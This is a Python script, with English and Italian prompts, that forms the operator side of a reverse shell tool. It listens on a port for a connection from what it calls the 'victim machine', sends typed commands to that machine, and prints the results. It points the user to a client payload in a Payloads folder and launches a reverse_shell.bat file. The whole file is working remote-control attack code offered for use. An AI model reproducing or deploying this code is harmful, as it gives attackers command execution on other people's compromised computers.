import sys
import os
import socket
import subprocess
import paramiko


language = ""
mode = ""
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
# CLIENT_HOST = "0.0.0.0"
# CLIENT_PORT = 5003
BUFFER_SIZE = 1024


def get_lang_and_mode():
    global mode
    if "lang.txt" in os.listdir():
        lang_file_path = "lang.txt"
    else:
        lang_file_path = "..\\lang.txt"
    with open(lang_file_path, "r") as lang_file:
        list_ = lang_file.readlines()
        language = list_[0]
        if mode == "":
            if len(list_) == 2:
                mode = list_[1]
            else:
                mode = "terminal"
        lang_list = list(language)
        if lang_list[-1] == "\n":
            lang_list.pop()
        language = "".join(lang_list)
        if len(list_) >= 2:
            mode = list_[1]
            with open(lang_file_path, "w") as lang_file:
                lang_file.write(language)


def main():
    get_lang_and_mode()
    # print(f"{language}, {mode}")
    loop = True
    while loop:
        global language, SERVER_HOST, SERVER_PORT, CLIENT_HOST, CLIENT_PORT, BUFFER_SIZE
        if "Payloads" in os.getcwd():
            server_addr = "server_addr.txt"
            if "server_addr.txt" in os.listdir():
                list_1 = open(server_addr, "r").readlines()
            else:
                list_1 = ""
            # client_addr = "client_addr.txt"
            # if "client_addr.txt" in os.listdir():
            #     list_2 = open(client_addr, "r").readlines()
            # else:
            #     list_2 = ""
        else:
            server_addr = "Payloads\\server_addr.txt"
            if "server_addr.txt" in os.listdir("Payloads"):
                list_1 = open(server_addr, "r").readlines()
            else:
                list_1 = ""
            # client_addr = "Payloads\\client_addr.txt"
            # if "client_addr.txt" in os.listdir("Payloads"):
            #     list_2 = open(client_addr, "r").readlines()
            # else:
            #     list_2 = ""
        # if list_1 and list_2:
        if list_1:
            if language == "English":
                print(f"Your IP address: {list_1[0][:-1]}\nYour port: {list_1[1][:-1]}\nBuffer: {list_1[2]}")
            else:
                print(f"Il tuo indirizzo IP: {list_1[0][:-1]}\nLa tua porta: {list_1[1][:-1]}\nBuffer: {list_1[2]}")
            # if language == "English":
            #     print(f"Client IP address: {list_2[0][:-1]}\nClient port: {list_2[1][:-1]}\nBuffer: {list_2[2]}")
            # else:
            #     print(f"Indirizzo IP client: {list_2[0][:-1]}\nPorta del client: {list_2[1][:-1]}\nBuffer: {list_2[2]}")
        else:
            # while True:
            #     if language == "English":
            #         client_host = input("Insert the IP address of the victim machine: ")
            #     else:
            #         client_host = input("Inserisci l'indirizzo IP della macchina vittima: ")
            #     if client_host:
            #         if client_host.lower() == "exit":
            #             if language == "English":
            #                 print("Goodbye!\n")
            #             else:
            #                 print("Arrivederci!\n")
            #             loop = False
            #             break
            #         else:
            #             if validate_ip(client_host):
            #                 CLIENT_HOST = client_host
            #                 break
            #             else:
            #                 if language == "English":
            #                     print("You have not entered a valid choice!")
            #                 else:
            #                     print("Non hai inserito una scelta valida!")
            # if not loop:
            #     break
            if language == "English":
                port = input("Insert the port of your machine you want to use (default: 5003): ")
            else:
                port = input("Inserisci la porta della tua macchina che vuoi usare (default: 5003): ")
            if port:
                if port.lower() == "exit":
                    if language == "English":
                        print("Goodbye!\n")
                    else:
                        print("Arrivederci!\n")
                    loop = False
                    break
                SERVER_PORT = int(port)
            # if language == "English":
            #     port = input("Insert the port of the victim machine you want to use (default: 5003): ")
            # else:
            #     port = input("Inserisci la porta della macchina vittima che vuoi usare (default: 5003): ")
            # if port:
            #     if port.lower() == "exit":
            #         if language == "English":
            #             print("Goodbye!\n")
            #         else:
            #             print("Arrivederci!\n")
            #         loop = False
            #         break
            #     CLIENT_PORT = int(port)
            if language == "English":
                buffer_size = input("Insert the buffer size you want to use (default: 1024): ")
            else:
                buffer_size = input("Inserisci la grandezza del buffer che vuoi usare (default: 1024): ")
            if buffer_size:
                if buffer_size.lower() == "exit":
                    if language == "English":
                        print("Goodbye!\n")
                    else:
                        print("Arrivederci!\n")
                    loop = False
                    break
                BUFFER_SIZE = int(buffer_size)
            with open(server_addr, "w") as server_addr:
                server_addr.write(f"{SERVER_HOST}\n{SERVER_PORT}\n{BUFFER_SIZE}\n")
            # with open(client_addr, "w") as client_addr:
            #     client_addr.write(f"{CLIENT_HOST}\n{CLIENT_PORT}\n{BUFFER_SIZE}\n")
            if language == "English":
                print("In the Payloads directory you find the program to run in the victim machine (client)")
            else:
                print("Nella Cartella Payloads trovi il programma da eseguire sulla macchina vittima (client)")
        server()
        if loop:
            while True:
                if language == "English":
                    exit_choice = input("Do you want to exit the program? [Y/n]: ")
                else:
                    exit_choice = input("Vuoi uscire dal programma? [Y/n]: ")
                exit_choice = exit_choice.lower()
                if exit_choice == "y" or exit_choice == "yes":
                    if language == "English":
                        print("Goodbye!\n")
                    else:
                        print("Arrivederci!\n")
                    loop = False
                    break
                elif exit_choice != "n" or exit_choice != "no":
                    if language == "English":
                        print("Returning to the menu!\n")
                    else:
                        print("Ritorno al menù!\n")
                    if mode == "menu":
                        with open("lang.txt", "a") as lang_file:
                            lang_file.write("\nmenu")
                        if "Payloads" in os.getcwd():
                            subprocess.Popen("reverse_shell.bat", shell=True)
                        else:
                            subprocess.Popen("Payloads\\reverse_shell.bat", shell=True)
                        sys.exit()
                    else:
                        break


def validate_ip(client_host):
    return True


def server():
    s = socket.socket()
    s.bind((SERVER_HOST, SERVER_PORT))
    s.listen(5)
    if language == "English":
        print(f"Listening as {SERVER_HOST}:{SERVER_PORT}...")
    else:
        print(f"Ascoltando come {SERVER_HOST}:{SERVER_PORT}...")
    client_socket, client_address = s.accept()
    if language == "English":
        print(f"{client_address[0]}:{client_address[1]} Connected!\n")
    else:
        print(f"{client_address[0]}:{client_address[1]} Connesso!\n")
    # message = "Hello and Welcome".encode()
    # client_socket.send(message)
    while True:
        if language == "English":
            command = input("Insert the command to execute: ")
        else:
            command = input("Inserisci il comando da eseguire: ")
        client_socket.send(command.encode())
        if command.lower() == "exit":
            break
        results = client_socket.recv(BUFFER_SIZE).decode()
        print(results)
    client_socket.close()
    s.close()


if __name__ == "__main__":
    main()
